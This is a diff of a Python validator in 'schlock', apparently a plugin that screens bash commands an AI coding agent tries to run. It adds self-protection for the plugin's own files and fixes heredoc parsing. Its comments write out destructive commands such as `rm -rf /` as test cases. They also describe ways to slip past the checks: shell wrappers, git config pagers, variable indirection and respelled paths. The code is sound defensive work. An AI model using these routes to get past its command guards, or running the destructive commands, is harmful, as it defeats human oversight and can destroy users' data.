@@ -16,8 +16,8 @@ from typing import Any, NamedTuple, Optional
 
 import yaml
 
+from schlock.core.native_bridge import MAX_COMMAND_SIZE
 from schlock.exceptions import ConfigurationError, ParseError
-from schlock.integrations.commit_filter import MAX_COMMAND_SIZE
 from schlock.integrations.shellcheck import (
     get_security_findings,
     is_shellcheck_available,
@@ -25,7 +25,15 @@ from schlock.integrations.shellcheck import (
 )
 
 from .cache import ValidationCache
-from .parser import WRAPPER_COMMANDS, BashCommandParser, heredoc_owner
+from .parser import (
+    FD_VARIABLE,
+    SHELL_COMMANDS,
+    WRAPPER_COMMANDS,
+    BashCommandParser,
+    has_compound_redirects,
+    heredoc_owner,
+    reset_parse_budget,
+)
 from .rules import RiskLevel, RuleEngine, RuleMatch, SecurityRule
 from .substitution import SubstitutionValidationResult, SubstitutionValidator
 
@@ -457,16 +465,16 @@ def _check_dangerous_command_flags(
 # suppression - then treats it as an inert string. So `bash "-c" "rm -rf /"` came back SAFE
 # while the bare payload was BLOCKED. The fix re-enters validation on the payload.
 #
-# Shells: `-c PROG` runs PROG, and a LEADING operand is the script to run, which ends option
-# parsing (`bash deploy.sh -c production` passes -c to the script, not to bash).
-_SHELL_COMMANDS: frozenset[str] = frozenset({"bash", "sh", "zsh", "dash", "ksh", "ash", "csh", "tcsh", "fish", "rbash"})
-
+# Shells (the parser's SHELL_COMMANDS, the one shell set): `-c PROG` runs PROG, and a LEADING
+# operand is the script to run, which ends option parsing (`bash deploy.sh -c production`
+# passes -c to the script, not to bash).
+#
 # Not shells, but their `-c` argument is a command string they hand to one. Their leading
 # operand is a user/group/file rather than a script, so it must NOT end option parsing
 # (`sg root -c PROG`, `su postgres -c PROG`).
 _DASH_C_RUNNERS: frozenset[str] = frozenset({"su", "runuser", "sg", "script"})
 
-_DASH_C_PROGRAM_COMMANDS: frozenset[str] = _SHELL_COMMANDS | _DASH_C_RUNNERS
+_DASH_C_PROGRAM_COMMANDS: frozenset[str] = SHELL_COMMANDS | _DASH_C_RUNNERS
 
 # Depth cap for re-entering validation on a payload. Reachable in practice only by chaining
 # `watch` (shell quoting collapses before `bash -c` can nest this far), so it is a backstop,
@@ -636,10 +644,12 @@ def _shell_delegated_payloads(
     """Extract every argument the command will hand to a shell as source code.
 
     Covers `<shell> -c PROG`, the same behind an exec wrapper (`sudo`, `timeout 5`,
-    `env FOO=1`, `busybox`, `flock ...`), `watch PROG`, and `find -exec/-execdir/-ok/-okdir
-    <shell> -c PROG ;` (LAB-2767), whose clause re-enters this same extraction.
+    `env FOO=1`, `busybox`, `flock ...`), `watch PROG`, `find -exec/-execdir/-ok/-okdir
+    <shell> -c PROG ;` (LAB-2767), whose clause re-enters this same extraction, and
+    `git config <exec-key> PROG` (LAB-4264), whose hand-off is DEFERRED — git runs PROG through a
+    shell on every later git command in that repo or for that user, not at this command.
 
-    Here-strings (`bash <<< "..."`) ride a redirect node the word-walker never sees, so they
+    Here-strings (`bash <<< "..."`) are a redirect word, not an argument, so they
     are surfaced by `parser.extract_stdin_program_redirects` instead and fed into the same
     Step 5c re-entry as these payloads (LAB-2768).
 
@@ -672,6 +682,15 @@ def _shell_delegated_payloads(
         base = cmd_name.rsplit("/", 1)[-1]
         found = []
 
+        # `git config <exec-key> PROG` arms PROG for every later git command. Checked ahead of the
+        # delegator/wrapper split below, and for wrappers too, because a wrapper hands the whole
+        # command straight through (`timeout 5 git config core.pager PROG`) and this scan keys on
+        # the `config` token rather than on the first word.
+        if base == "git" or base in WRAPPER_COMMANDS:
+            from schlock.core.substitution import git_config_exec_payload  # noqa: PLC0415
+
+            found.append(git_config_exec_payload(args))
+
         if base == "watch":
             found.append(_watch_payload(args))
         elif base == "find":
@@ -681,7 +700,7 @@ def _shell_delegated_payloads(
                 found.extend(_shell_delegated_payloads([(clause[0], clause[1:])], _seen=seen))
         else:
             if base in _DASH_C_PROGRAM_COMMANDS:
-                found.append(_dash_c_payload(args, operand_ends_options=base in _SHELL_COMMANDS))
+                found.append(_dash_c_payload(args, operand_ends_options=base in SHELL_COMMANDS))
             if base in WRAPPER_COMMANDS:
                 # `sudo bash -c ...`, `timeout 5 sg root -c ...`, `timeout 5 watch ...`: re-enter
                 # the FULL extractor on every arg position that names a recognized command, so
@@ -733,10 +752,17 @@ def _check_contextual_high_risk(
     return None
 
 
-# SELF-PROTECTION: Paths that identify schlock configuration files.
-# Any command containing these paths is subject to allowlist enforcement.
-# Also imported by hooks/pre_tool_use.py for hook-level self-protection.
-SELF_PROTECTION_PATHS = ("schlock-config.yaml", ".config/schlock/config.yaml")
+# SELF-PROTECTION: Paths that identify schlock configuration files, and the plugin directories
+# holding the native parser binaries + MANIFEST (bin/) and the vendored Python deps (vendor/) —
+# a swap of either is a global under-block, since every rule reads what they parse (spec §7).
+# A directory entry covers everything beneath it. Any command containing these paths is subject
+# to allowlist enforcement. hooks/self_protect.py keeps a copy (test_self_protect.py syncs them).
+SELF_PROTECTION_PATHS = (
+    "schlock-config.yaml",
+    ".config/schlock/config.yaml",
+    ".claude-plugin/bin",
+    ".claude-plugin/vendor",
+)
 
 
 def _matches_protected_path(text: str) -> bool:
@@ -755,37 +781,34 @@ def _matches_protected_path(text: str) -> bool:
                 break
             # Character before must be path separator, whitespace, quote, or start
             before_ok = idx == 0 or text[idx - 1] in " \t\n\"'(,;|&>=/"
-            # Character after must be whitespace, quote, punctuation, or end
+            # Character after must be whitespace, quote, punctuation, a path separator
+            # (a directory entry's contents), or end
             end = idx + len(path)
-            after_ok = end >= len(text) or text[end] in " \t\n\"'(),;|&>"
+            after_ok = end >= len(text) or text[end] in " \t\n\"'(),;|&>/"
             if before_ok and after_ok:
                 return True
             idx += 1
     return False
 
 
-# SELF-PROTECTION: Read-only commands allowed to reference config files.
-# Allowlist approach: any command NOT in this set is BLOCKED when it references config paths.
-# Only inherently read-only commands are included (cannot modify files by design).
+# SELF-PROTECTION: Read-only commands allowed to reference protected paths.
+# Allowlist approach: any command NOT in this set is BLOCKED when it references a protected path.
+# Only inherently read-only commands are included (cannot modify files by design). "Reads" is
+# not enough: a command that can be told to run another program of the caller's choosing is
+# out — rg, ag, ack, less, more (less on macOS), bat and view (vim). See
+# test_blocks_read_commands_that_can_run_a_program.
 _SELF_PROTECTION_READ_ALLOWLIST = frozenset(
     {
         "cat",
         "grep",
         "egrep",
-        "fgrep",
-        "rg",
-        "ag",
-        "ack",  # Content viewing/searching
+        "fgrep",  # Content viewing/searching
         "ls",
         "dir",
         "stat",
         "file",  # File info
         "head",
         "tail",
-        "less",
-        "more",
-        "bat",
-        "view",  # Pagers/viewers
         "wc",
         "md5sum",
         "sha256sum",
@@ -804,24 +827,45 @@ _SELF_PROTECTION_READ_ALLOWLIST = frozenset(
     }
 )
 
-# Pre-compiled regex for redirect operators targeting config paths
-_SELF_PROTECTION_REDIRECT_PATTERNS = [re.compile(r">>?\s*\S*" + re.escape(path)) for path in SELF_PROTECTION_PATHS]
+# Pre-compiled regex for redirect operators targeting protected paths; the lookahead is
+# _matches_protected_path's after-boundary, so `> .claude-plugin/binary.md` is not a hit.
+_SELF_PROTECTION_REDIRECT_PATTERNS = [
+    re.compile(r">>?\s*\S*" + re.escape(path) + r"""(?=[\s"'(),;|&>/]|$)""") for path in SELF_PROTECTION_PATHS
+]
+
+# `//` and `/./` runs, which name the same path as a single `/` (`.claude-plugin//bin`).
+_PATH_RESPELLING_RE = re.compile(r"/(?:\.?/)+")
 
 # Pre-compiled regex for splitting command strings into segments
 _SEGMENT_SPLIT_RE = re.compile(r"\s*(?:\|(?!\|)|\|\||&&|;)\s*")
 
 
-def _check_self_protection(command: str) -> Optional[ValidationResult]:
-    """Allowlist-based check preventing modification of schlock configuration files.
+def _is_plain_read(segment: str) -> bool:
+    """True if `segment` is a bare allowlisted reader and nothing else.
 
-    SECURITY CRITICAL: Uses an allowlist approach — when a config path is detected
-    in a command, only known read-only commands are permitted. All other commands
-    are blocked. This prevents bypass via obscure write commands (ln, dd, rsync, etc.)
-    that a denylist would miss.
+    Bare means the first word IS an allowlist name: no `VAR=` prefix (a loader variable or
+    PATH decides what that name runs), no path (`/tmp/x/cat` is not cat), and no process
+    substitution, which can hide any command inside an allowed one.
+    """
+    words = segment.split()
+    return bool(words) and words[0] in _SELF_PROTECTION_READ_ALLOWLIST and not re.search(r"[<>]\s*\(", segment)
+
+
+def _check_self_protection(command: str, parsed_segments: Optional[list[str]] = None) -> Optional[ValidationResult]:
+    """Allowlist-based check preventing modification of schlock's protected paths.
+
+    SECURITY CRITICAL: Uses an allowlist approach — when a protected path (config file or
+    vendored parser/deps directory) appears anywhere in a command, EVERY segment of that
+    command must be a plain read (`_is_plain_read`); anything else blocks. This prevents
+    bypass via obscure write commands (ln, dd, rsync, etc.) that a denylist would miss, and
+    via any segment that changes what a later reader's name runs (`export`, a function
+    definition, `hash -p`) — which is why segments that never name the path count too.
 
     Defense-in-depth: This is layer 2 of 3. Even if YAML rules (layer 1) are corrupted
     or the hook file_path check (layer 3) is bypassed, this hardcoded check blocks
-    config tampering.
+    tampering. Step 3 of validate_command runs it on the raw string; once the command has
+    parsed, validate_command runs it again with the parsed segments, because the regex split
+    below keeps `ls & cp ...` and newline-chained commands in one segment.
 
     Known limitation: Variable indirection (e.g., f=config.yaml; rm "$f") can bypass
     this check because the expanded path doesn't appear in the command string. Mitigated
@@ -829,69 +873,48 @@ def _check_self_protection(command: str) -> Optional[ValidationResult]:
 
     Args:
         command: Command string to check
+        parsed_segments: The command's segments from the AST, when it has parsed
 
     Returns:
-        ValidationResult blocking the command if it targets schlock config, None otherwise
+        ValidationResult blocking the command if it touches a protected path, None otherwise
     """
-    # Fast path: skip if command doesn't reference any config path
-    if not _matches_protected_path(command):
+    # Detection-only copies, case-folded (APFS and NTFS are case-insensitive by default) with
+    # `//` and `/./` collapsed, so a respelling of a protected path still matches.
+    probe = _PATH_RESPELLING_RE.sub("/", command.lower())
+
+    # Fast path: skip if command doesn't reference any protected path
+    if not _matches_protected_path(probe):
         return None
 
-    # Check 1: Block any redirect operators (> or >>) targeting config files
+    # Check 1: Block any redirect operators (> or >>) targeting a protected path
     for pattern in _SELF_PROTECTION_REDIRECT_PATTERNS:
-        if pattern.search(command):
+        if pattern.search(probe):
             return _make_self_protection_result(command)
 
-    # Check 2: Allowlist — verify all commands touching config paths are read-only
-    # NOTE: Uses regex splitting rather than bashlex AST parsing. This is intentional:
-    # - Self-protection runs pre-parse on the hot path; AST adds ~5ms latency
-    # - AST parsing can itself fail, requiring fallback logic
-    # - The allowlist approach already handles known bypass constructs:
-    #   * Subshells: $(cmd) → first word is "$(cmd", not in allowlist → BLOCKED
-    #   * eval: eval "rm ..." → "eval" not in allowlist → BLOCKED
-    #   * Quoting: config path must appear as literal string for fast-path trigger
-    # - Only variable indirection (f=config; rm "$f") bypasses this check,
-    #   which AST parsing also can't solve (bashlex doesn't resolve variables).
-    #   Mitigated by YAML rules (layer 1) and hook file_path checks (layer 3).
-    segments = _SEGMENT_SPLIT_RE.split(command)
-    for raw_segment in segments:
-        segment = raw_segment.strip()
-        if not segment:
-            continue
-        # Strip leading environment variable assignments (e.g., "DUMMY=1 FOO=bar rm ...")
-        # These prefix a command but don't change what it does — the command after them
-        # is what matters. If ONLY assignments remain, it's a pure assignment (skip).
-        stripped = re.sub(r'^([A-Za-z_]\w*=(?:"[^"]*"|\'[^\']*\'|\S*)\s+)+', "", segment)
-        if not stripped:
-            continue
-        # Only check segments that reference a config path
-        if not _matches_protected_path(segment):
-            continue
-        # Extract command name (first word, strip path prefix)
-        words = stripped.split()
-        if not words:
-            continue
-        cmd = words[0].rsplit("/", 1)[-1]
-        if cmd not in _SELF_PROTECTION_READ_ALLOWLIST:
-            return _make_self_protection_result(command)
-        # Even if cmd is allowlisted, block if segment contains process substitution
-        # >(cmd) or <(cmd) — these can hide arbitrary commands inside an allowed outer command
-        if re.search(r"[<>]\s*\(", segment):
-            return _make_self_protection_result(command)
+    # Check 2: Allowlist — every segment is a plain read. The raw string is split by regex
+    # (this runs pre-parse, and parsing can fail); subshells `$(cmd`, `eval` and quoted names
+    # are not allowlist words, so they block here.
+    # ponytail: a pipeline counts as segments too, so `cat <protected> | sort` blocks. Allow
+    # downstream pipe stages if that over-block bites; they cannot redefine the reader.
+    segments = _SEGMENT_SPLIT_RE.split(probe) + [_PATH_RESPELLING_RE.sub("/", s.lower()) for s in parsed_segments or []]
+    if not all(_is_plain_read(segment) for segment in segments if segment.strip()):
+        return _make_self_protection_result(command)
 
     return None
 
 
 def _make_self_protection_result(command: str) -> ValidationResult:
     """Create a BLOCKED ValidationResult for self-protection violations."""
-    logger.warning(f"Self-protection: blocked config modification attempt: {command[:100]}")
+    logger.warning(f"Self-protection: blocked a command referencing a protected path: {command[:100]}")
     return ValidationResult(
         allowed=False,
         risk_level=RiskLevel.BLOCKED,
-        message="BLOCKED: Modification of schlock safety configuration is not allowed",
+        message="BLOCKED: Only plain read commands may reference schlock's configuration or vendored parser files",
         alternatives=[
             "Edit schlock configuration manually outside of Claude Code",
             "Use /schlock:setup to configure schlock interactively",
+            "Restore vendored parser files by reinstalling: /plugin install schlock@schlock",
+            "To read these files, run cat, grep, head, tail or ls on its own: no VAR= prefix, no other commands",
         ],
         exit_code=1,
         error=None,
@@ -983,6 +1006,7 @@ def _match_original_and_reconstructed(
     string_literals: list[tuple],
     quote_source: str,
     heredoc_ranges: Optional[list[tuple]] = None,
+    use_whitelist: bool = True,
 ) -> RuleMatch:
     """Match `command` against the rules as written AND quote/escape-stripped.
 
@@ -1022,9 +1046,23 @@ def _match_original_and_reconstructed(
                       not a silent wrong answer. Only quote detection uses it; the
                       ranges returned are offsets into the reconstruction, which
                       is built from `ast_nodes` alone either way.
-        heredoc_ranges: Heredoc ranges for the original-form pass only: heredoc
-                        bodies never reach the reconstruction, since
-                        _collect_words walks `.word` parts alone.
+        heredoc_ranges: Heredoc ranges for the original-form pass only. A body parked
+                        on `redirect.heredoc` never reaches a reconstruction, because
+                        `_redirect_words` reads only `redirect.output`, the delimiter.
+                        Two bodies still do: one carried verbatim inside a
+                        command-substitution word, which `_reconstruct` suppresses
+                        itself (a `<( … )` body is never inert, so never suppressed),
+                        and one inside a compound, where bashlex parses the
+                        body as commands (`{ cat <<EOF … } > f; echo b` reconstructs
+                        with the body's words). The second can only over-block.
+        use_whitelist: Whether the whitelist may short-circuit ANY of the three forms.
+                       One switch for all three, deliberately: the whitelist is
+                       prefix-based, so a caller that needs it off (the compound
+                       whole-command pass, where a leading `ls` would otherwise
+                       vouch for a later redirect) needs it off for the original
+                       form too. Applying it to the reconstructions alone worked
+                       only because a compound's reconstruction never equals its
+                       source, which is an accident of shape, not a guarantee.
 
     Returns:
         The higher-risk of the two matches.
@@ -1033,13 +1071,24 @@ def _match_original_and_reconstructed(
         command,
         string_literals=string_literals,
         heredoc_ranges=heredoc_ranges,
+        use_whitelist=use_whitelist,
     )
 
-    reconstructed, suppression_ranges = parser.reconstruct_command_with_suppression_ranges(quote_source, ast_nodes)
-    if reconstructed and reconstructed != command:
-        recon_match = engine.match_command(reconstructed, string_literals=suppression_ranges)
-        if recon_match.risk_level > match.risk_level:
-            return recon_match
+    # Three forms, highest risk wins. The two reconstructions are NOT a before/after
+    # pair - each is the only form a whole family of rules can match (LAB-2760):
+    # `>\s*/dev/sd[a-z]` needs the redirect present, while rule 08's `[^>]{0,200}`
+    # and rule 03's `^\s*env\s*$` only match once it is gone.
+    seen = {command}
+    for form, ranges in (
+        parser.reconstruct_command_with_suppression_ranges(quote_source, ast_nodes),
+        parser.reconstruct_without_redirects(quote_source, ast_nodes),
+    ):
+        if not form or form in seen:
+            continue
+        seen.add(form)
+        form_match = engine.match_command(form, string_literals=ranges, use_whitelist=use_whitelist)
+        if form_match.risk_level > match.risk_level:
+            match = form_match
 
     return match
 
@@ -1149,13 +1198,13 @@ _FRESH, _TIME, _TIMEP, _REDIR, _ASSIGNED, _COPROC, _NAMED, _LOST = (
 )
 _RESERVED_WORDS = frozenset(("if", "then", "elif", "else", "while", "until", "do", "!", "{"))
 _ASSIGNMENT_WORD_RE = re.compile(r"[A-Za-z_]\w*(\[.*\])?\+?=", re.DOTALL)  # `x=`, `a[1]=`, `x+=`, quotes and all after
-_REDIRECT_WORD_RE = re.compile(r"([0-9]*|\{[A-Za-z_]\w*\})[<>]|&>")  # `<`, `2>`, `{fd}>`, `&>`, `<<'E'`, `<<<`
+_REDIRECT_WORD_RE = re.compile(rf"([0-9]*|{FD_VARIABLE})[<>]|&>")  # `<`, `2>`, `{fd}>`, `&>`, `<<'E'`, `<<<`
 # What a word may hold and still absorb a following `<` or `>`: an fd prefix,
 # or the first character of a two-character operator (`>>`, `<>`, `&>>`).
-_FD_RE = re.compile(r"([0-9]*|\{[A-Za-z_]\w*\}|&)[<>]?")
+_FD_RE = re.compile(rf"([0-9]*|{FD_VARIABLE}|&)[<>]?")
 # `2>&-` closes the descriptor: the `-` is the whole target even glued, so
 # `2>&-a[0]=1` is a redirection and then an assignment (verified).
-_FD_CLOSE_RE = re.compile(r"([0-9]*|\{[A-Za-z_]\w*\})[<>]&")
+_FD_CLOSE_RE = re.compile(rf"([0-9]*|{FD_VARIABLE})[<>]&")
 _ASSIGNMENT_PREFIX_RE = re.compile(r"[A-Za-z_]\w*(\[.*\])?\+?=", re.DOTALL)  # `x=(…)` opens a compound assignment
 _IDENTIFIER_RE = re.compile(r"[A-Za-z_]\w*")
 # Blanks and control-operator characters end a word at the top level. `<` and
@@ -1336,7 +1385,7 @@ def _expansion_frame_at(line: str, pos: int, nested: bool) -> Optional[tuple[str
     popping the `${…}` on it re-arms the very phantom opener this exists to
     prevent. At the top level both re-lex as shell and a heredoc inside them is
     real (`x=$(cat <<'E' … E)`), so they stay untracked and their openers are
-    found.
+    found - and, inside a backtick, refused (see `_rewrite_openers`).
     """
     for opener, owed in _EXPANSION_FRAMES:
         if line.startswith(opener, pos):
@@ -1510,10 +1559,13 @@ def _read_delimiter(text: str, pos: int) -> tuple[str, int]:
     Returns ``(delimiter, offset just past the word)``.
 
     Raises:
-        ParseError: on an unterminated quote, an empty delimiter, or an escape
-            inside `$'…'`. A delimiter this cannot tokenize is a body boundary it
-            cannot locate, so the caller must not vouch for anything around it.
+        ParseError: on an unterminated quote, an empty delimiter, an escape
+            inside `$'…'`, or an expansion in the word: `${`, `$(`, `$[`, a
+            backtick, or a `<(` / `>(` glued to its end. A delimiter this cannot
+            tokenize is a body boundary it cannot locate, so the caller must not
+            vouch for anything around it.
     """
+    start = pos
     delimiter: list[str] = []
     while pos < len(text) and text[pos] not in _WORD_START_AFTER:
         char = text[pos]
@@ -1549,6 +1601,19 @@ def _read_delimiter(text: str, pos: int) -> tuple[str, int]:
         else:
             delimiter.append(char)
             pos += 1
+
+    # bash removes a delimiter's quotes only at the top level of the word, not inside an
+    # expansion: `<<${a'b'}` ends at a line reading `${a'b'}`, and the body is expanded,
+    # while the loop above reads `${ab}`. An expansion also carries the word past where
+    # the loop stops: at `(` in `<<$(x)`, at the blank in `<<$[a b]'x'` (bash ends that at
+    # `$[a b]x`), and at `<` in `<<'E'<(true)` (bash ends that at `E<(true)`, but a blank
+    # before `<(` does end the word). Refused rather than modelled. That refuses quoted
+    # and escaped spellings too, such as `<<'$(x)'` or `<<"${x}"`, which bash reads
+    # literally, and it is deliberate: it only over-blocks, and telling them apart is the
+    # quote modelling this refusal exists to avoid.
+    word = text[start : pos + 1]  # with the character that stopped it
+    if any(s in word for s in ("${", "$(", "$[", "`")) or text[pos : pos + 2] in ("<(", ">("):
+        raise ParseError("Expansion in a heredoc delimiter; the line that ends its body is unknown")
 
     if not delimiter:
         # Also a quoted empty one (`<<''`): bash ends that at the first empty line, but
@@ -1604,10 +1669,8 @@ def _rewrite_openers(  # noqa: PLR0912, PLR0915 - one branch per lexical state; 
     out: list[str] = []
     openers: list[tuple[str, bool, int, int]] = []
     continued = False
-    # Where the last backslash escape ended. A `#` sitting exactly there
-    # follows an ESCAPED word character, which bash keeps inside the word.
-    after_escape = -1
     pos = 0
+    after_escape = -1  # index just past the last `\x` pair; the `#` branch reads it
     opener_serials: list[int] = []
     if scan.contexts[-1].prefix:
         scan.contexts[-1].start = 0  # a word begun on an earlier line continues from the first column
@@ -1663,10 +1726,10 @@ def _rewrite_openers(  # noqa: PLR0912, PLR0915 - one branch per lexical state; 
             if char == "`":
                 # A top-level backtick is shell again, exactly like `$(…)`, and
                 # `_expansion_frame_at` deliberately does not frame it so the
-                # heredocs inside it stay findable. It had no context of its
-                # own, so its contents were read against the *enclosing* one and
-                # an operator inside it reset the outer command position that
-                # was not its to reset. That invents an opener:
+                # heredocs inside it stay findable - to be refused at `<<`. It
+                # had no context of its own, so its contents were read against
+                # the *enclosing* one and an operator inside it reset the outer
+                # command position that was not its to reset. That invents an opener:
                 # `x=`ls | sort` y[1<<b]=1` is one assignment word to bash, which
                 # runs the line and opens no heredoc, while this read `b]=1` as a
                 # delimiter and deleted the next line as its body. One character
@@ -1798,13 +1861,6 @@ def _rewrite_openers(  # noqa: PLR0912, PLR0915 - one branch per lexical state; 
             and pos != after_escape
             and (pos == 0 or line[pos - 1] in _WORD_START_AFTER)
         ):
-            # Every character in _WORD_START_AFTER can be backslash-escaped, and
-            # an escaped one is word TEXT to bash, not a boundary: `cat \ #x`
-            # reads `#x` as part of the word. The raw lookup at `line[pos - 1]`
-            # cannot tell an escaped blank from a real one, so `after_escape`
-            # does. This matters most once lines are joined: a phantom comment
-            # hides a trailing `\`, ends the logical line early, and hands the
-            # next line to _neuter_heredocs as heredoc body (LAB-4332).
             # `#` is ordinary inside every frame - `${#x}`, `${x#pre}` - so the
             # comment branch must not abandon the scan mid-expansion. An open
             # word rules it out too, for its own reason: `ctx.prefix` means text
@@ -1816,12 +1872,25 @@ def _rewrite_openers(  # noqa: PLR0912, PLR0915 - one branch per lexical state; 
             # The cost of using `prefix` is that a lone operator can be the folded
             # text - `cat >\<newline>#f` reads `#f` as a word - which is a shape
             # bash rejects outright, so it can invent an opener but not hide one.
+            # `pos != after_escape` is the same rule for an escape on this line:
+            # `cat \ #x` is the one argument ` #x`, and the raw lookup at
+            # `line[pos - 1]` cannot tell that escaped blank from a real one.
+            # Read as a comment, the logical line ends early and the commands
+            # after it are handed to _neuter_heredocs as body text.
             out.append(line[pos:])  # comment: text, not shell
             break
         elif line.startswith("<<<", pos):
             out.append("<<<")  # here-string, not a heredoc (LAB-2768)
             pos += 3
         elif line.startswith("<<", pos) and not frames:
+            if any(context.backtick for context in scan.contexts):
+                # Bash ends a backtick at the first unescaped `` ` `` in the raw
+                # text, quotes included, and takes a heredoc body from inside
+                # it: `echo ` <<b `` then `rm -rf /` then `b` runs the `rm`
+                # (canary), while reading the body from the lines below deleted
+                # it. Where the backtick really ends is not something this scan
+                # can vouch for, so refuse rather than guess.
+                raise ParseError("Heredoc opener inside a backtick; bash reads its body from the substitution alone")
             opener_at = pos
             pos += 2
             strips_tabs = line.startswith("-", pos)
@@ -1903,6 +1972,32 @@ def _blank_body_line(line: str) -> str:
     have suppressed from matching anyway.
     """
     return "x" * len(line)
+
+
+def _body_line(lines: list[str], index: int, quoted: bool) -> tuple[str, list[str]]:
+    """The heredoc body line bash reads from ``lines[index]``, and the physical lines it spans.
+
+    Bash tests the delimiter against this line, not against a physical one. In an UNQUOTED
+    body its `read_secondary_line` deletes each unescaped backslash-newline as it reads, so
+    `EO\\` followed by `F` is one line, `EOF`, and it ends an `<<EOF` body (LAB-5272). Compare
+    physical lines instead and the body runs on to some later `EOF`, filing every command in
+    between as inert body text.
+
+    A physical line with an odd run of trailing backslashes joins; an even run is escaped
+    backslashes and does not. bashlex is not so careful - it deletes EVERY backslash-newline,
+    escaped or not - which `_neuter_heredocs` has to answer for. A QUOTED body is literal:
+    bash's heredoc reader never joins it, so neither does this.
+    """
+    end = index + 1
+    while not quoted and end < len(lines) and (len(lines[end - 1]) - len(lines[end - 1].rstrip("\\"))) % 2:
+        end += 1
+    physical = lines[index:end]
+    return "".join(part[:-1] for part in physical[:-1]) + physical[-1], physical
+
+
+def _is_terminator(line: str, delimiter: str, strips_tabs: bool) -> bool:
+    """Whether body line ``line`` ends the heredoc: `<<-` strips its leading tabs first, as bash does."""
+    return (line.lstrip("\t") if strips_tabs else line) == delimiter
 
 
 class _BashlexHeredoc(NamedTuple):
@@ -2002,7 +2097,7 @@ def _shell_heredoc_bodies(command: str, blanked: list[tuple[int, int, int]], her
     bodies: list[str] = []
     for opener_start, body_start, body_end in blanked:
         owner = owners.get(opener_start)
-        if owner is not None and owner not in _SHELL_COMMANDS:
+        if owner is not None and owner not in SHELL_COMMANDS:
             continue
         if command[body_start:body_end].strip():
             bodies.append(command[body_start:body_end])
@@ -2135,24 +2230,25 @@ def _normalise_heredoc_delimiters(command: str) -> _Normalised:
 
             out.append(line)
 
-            # Bodies are consumed in opener order, exactly as _neuter_heredocs does it,
-            # and for the same reason: the delimiter comparison has to match bash's or a
-            # body line gets mistaken for the terminator.
+            # Bodies are consumed in opener order, and read line by line (`_body_line`),
+            # exactly as _neuter_heredocs does it, and for the same reason: the delimiter
+            # comparison has to match bash's or a body line gets mistaken for the
+            # terminator, or the terminator for a body line.
             for (delimiter, strips_tabs, start, _), quoted in zip(openers, was_quoted):
                 body_start = at
                 while index < len(lines):
-                    body = lines[index]
+                    body, physical = _body_line(lines, index, quoted)
                     line_at = at
-                    at += len(body) + 1
-                    index += 1
-                    if (body.lstrip("\t") if strips_tabs else body) == delimiter:
-                        out.append(body)  # terminator stays verbatim; bashlex ends here
+                    at += sum(len(part) + 1 for part in physical)
+                    index += len(physical)
+                    if _is_terminator(body, delimiter, strips_tabs):
+                        out.extend(physical)  # terminator stays verbatim
                         if quoted:
                             # The body runs up to the newline before the terminator; an
                             # empty one slices to "" and is never delegated.
                             blanked.append((line_start + start, body_start, line_at - 1))
                         break
-                    out.append(_blank_body_line(body) if quoted else body)
+                    out.extend(_blank_body_line(part) if quoted else part for part in physical)
                 else:
                     # No terminator: where the body ends is unknown, so which text is
                     # shell is unknown. Hand it back untouched and let the fallback deny.
@@ -2272,8 +2368,10 @@ def _neuter_heredocs(command: str) -> tuple[str, str]:  # noqa: PLR0912, PLR0915
             base_command = logical[: openers[0][2]].strip()
 
         # Bodies are consumed in opener order. `<<-` strips leading tabs from the
-        # terminator line as well as the body, so the comparison has to match
-        # bash's or a body line would be mistaken for the terminator.
+        # terminator line as well as the body, and an unquoted body's lines are
+        # joined across backslash-newlines first (`_body_line`), so the comparison
+        # has to match bash's or a body line would be mistaken for the terminator -
+        # or the terminator for a body line, swallowing the shell after it.
         for delimiter, strips_tabs, start, end in openers:
             # A dropped (or empty) body still leaves one blank line: bashlex rejects
             # an empty heredoc inside a compound statement, which would deny every
@@ -2283,19 +2381,21 @@ def _neuter_heredocs(command: str) -> tuple[str, str]:  # noqa: PLR0912, PLR0915
             quoted = _delimiter_is_quoted(logical, delimiter, strips_tabs, start, end)
             body_lines: list[str] = []
             while index < len(lines):
-                body = lines[index]
-                at += len(body) + 1
-                index += 1
-                if (body.lstrip("\t") if strips_tabs else body) == delimiter:
+                body, physical = _body_line(lines, index, quoted)
+                at += sum(len(part) + 1 for part in physical)
+                index += len(physical)
+                if _is_terminator(body, delimiter, strips_tabs):
                     if quoted or not body_lines:
                         rewritten.append("")
-                    elif (len(body_lines[-1]) - len(body_lines[-1].rstrip("\\"))) % 2:
-                        # The last line ends in an unescaped `\`, which bash joins onto the
-                        # terminator - so bash does not end the body here - and so would
-                        # bashlex, reading on past the placeholder. Where the body ends is
-                        # unknown. (A `\` on any earlier line only joins two body lines.)
+                    elif body_lines[-1].endswith("\\"):
+                        # The run of backslashes is even - an odd one would have joined this
+                        # line onto the terminator - so bash reads escaped backslashes and ends
+                        # the body here. bashlex deletes every backslash-newline, escaped or
+                        # not, so it would join this line onto the placeholder and read the
+                        # command after it as body.
                         raise ParseError(
-                            "An unquoted heredoc's last body line ends in a backslash; where the body ends is unknown"
+                            "An unquoted heredoc's last body line ends in a backslash, which bashlex "
+                            "joins onto the rewrite delimiter; where the body ends is unknown"
                         )
                     else:
                         # The leading blank line absorbs a bashlex quirk: inside a compound
@@ -2307,10 +2407,12 @@ def _neuter_heredocs(command: str) -> tuple[str, str]:  # noqa: PLR0912, PLR0915
                 if not quoted and _HEREDOC_PLACEHOLDER in body:
                     # bashlex ends the kept body at a line equal to the placeholder (after the
                     # `<<-` tab strip), and bash does not, so the command behind it would be
-                    # read as body. Containment is a strict superset of that line test, and
-                    # needs no copy of bashlex's strip. (A quoted body is dropped, so it cannot.)
+                    # read as body. The placeholder holds no backslash, so any line bashlex
+                    # joins into it is one bash joins too: containment in the joined line is a
+                    # strict superset of that line test, and needs no copy of bashlex's strip.
+                    # (A quoted body is dropped, so it cannot.)
                     raise ParseError("An unquoted heredoc body contains the rewrite delimiter")
-                body_lines.append(body)
+                body_lines.extend(physical)
             else:
                 raise ParseError(f"Heredoc {delimiter!r} has no terminator; its body has no end")
 
@@ -2479,11 +2581,9 @@ def _escalate_past_heredoc(
     The rewritten command is validated through the front door, so it gets the
     whole pipeline - segments, substitutions, dangerous flags, rules - rather
     than a second hand-rolled approximation of it. Its segments are then
-    validated individually as well, because a full-span whitelist entry
-    short-circuits the whole-command pass before the per-segment loop it relies
-    on. A whitelisted *prefix* used to do the same; #146 (LAB-2752) narrowed
-    that gate to `is_fully_whitelisted`, so the prefix case no longer reaches
-    it, but an end-anchored entry still does.
+    validated individually as well, because a whitelist entry that declares every
+    command in the line (`is_whitelisted_whole`) short-circuits the whole-command
+    pass before the per-segment loop it relies on; one such entry is enough.
     Neither pass subsumes the other: the whole-command pass is the only one that
